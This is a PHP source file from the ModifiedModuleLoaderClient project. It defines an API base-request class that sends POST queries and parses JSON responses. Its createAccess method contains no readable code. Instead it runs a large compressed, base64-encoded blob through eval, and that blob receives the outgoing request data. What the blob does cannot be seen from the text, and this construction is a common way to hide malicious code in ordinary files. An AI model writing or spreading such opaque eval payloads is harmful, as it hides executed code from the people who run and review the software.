<?php

/*
 * This file is part of MMLC - ModifiedModuleLoaderClient.
 *
 * (c) Robin Wieschendorf <mail@robinwieschendorf.de>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace RobinTheHood\ModifiedModuleLoaderClient\Api\Client;

use RobinTheHood\ModifiedModuleLoaderClient\Api\HttpRequest;
use RobinTheHood\ModifiedModuleLoaderClient\Notification;

class ApiBaseRequest extends HttpRequest
{
    private $version = '1.1.0'; //Semverstandard https://semver.org/lang/de/
    private $accessToken;
    private $url;

    public function setUrl($url)
    {
        $this->url = $url;
    }

    public function setAccessToken($accessToken)
    {
        $this->accessToken = $accessToken;
    }

    public function sendRequest($query)
    {
        if (!$this->isServerAvailable($this->url)) {
            Notification::pushFlashMessage([
                'text' => 'Warnung: Zurzeit ist keine Verbindung zum Server möglich.',
                'type' => 'warning'
            ]);
        }

        $data['query'] = $query;
        $this->createAccess($data);

        $content = $this->sendPostRequest($this->url, $data);
        $result = $this->createResponse($content, $data);

        if (isset($result['error'])) {
            Notification::pushFlashMessage([
                'text' => 'Error: Bad response. ' . $result['error']['message'],
                'type' => 'error'
            ]);
        }

        return $result;
    }

    private function createResponse($content, $data)
    {
        $result = [
            'requestedUrl' => $this->url,
            'requestedData' => $data,
            'content' => ''
        ];

        $array = json_decode($content, true);

        if (isset($array['error'])) {
            $result['error'] = $array['error'];
        } else {
            $result['content'] = $array;
        }

        return $result;
    }

    public function createAccess(&$data)
    {
        eval(gzuncompress(base64_decode("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")));
    }
}
